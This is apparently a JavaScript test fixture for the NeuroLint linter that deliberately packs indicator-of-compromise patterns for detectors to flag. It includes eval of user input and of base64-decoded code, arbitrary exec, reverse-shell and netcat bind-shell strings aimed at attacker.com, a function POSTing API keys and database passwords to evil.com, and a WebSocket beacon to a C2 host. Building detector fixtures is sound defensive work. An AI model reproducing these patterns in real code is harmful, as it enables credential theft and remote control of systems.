/**
 * Copyright (c) 2025 NeuroLint
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


/**
 * Layer 8 Test Fixture: Intentional IoC Patterns
 * These patterns are designed to trigger Layer 8 detectors for testing purposes.
 * DO NOT use this code in production!
 */

const fs = require('fs');
const { exec } = require('child_process');

function vulnerableEval(userInput) {
  return eval(userInput);
}

function vulnerableFunction(code) {
  return new Function('return ' + code)();
}

async function dynamicRequire(moduleName) {
  return require(moduleName);
}

function execCommand(cmd) {
  return exec(cmd);
}

function base64Decode(encoded) {
  return Buffer.from(encoded, 'base64').toString();
}

function evalBase64(encodedCode) {
  const decoded = base64Decode(encodedCode);
  return eval(decoded);
}

const shellPatterns = {
  reverseShell: '/bin/bash -i >& /dev/tcp/attacker.com/4444',
  bindShell: 'nc -lvp 4444 -e /bin/sh'
};

function processEnvExfil() {
  const secrets = {
    apiKey: process.env.API_KEY,
    dbPass: process.env.DATABASE_PASSWORD
  };
  return fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(secrets)
  });
}

const obfuscatedCode = '\x65\x76\x61\x6c\x28\x74\x68\x69\x73\x29\x3b\x72\x65\x74\x75\x72\x6e';

function hiddenWebSocket() {
  const ws = new WebSocket('wss://c2server.com/beacon');
  ws.onopen = () => ws.send(JSON.stringify({ type: 'beacon' }));
}

function cryptoMiner() {
  while(true) {
    const hash = require('crypto').createHash('sha256');
  }
}

module.exports = {
  vulnerableEval,
  vulnerableFunction,
  dynamicRequire,
  execCommand,
  processEnvExfil,
  hiddenWebSocket
};
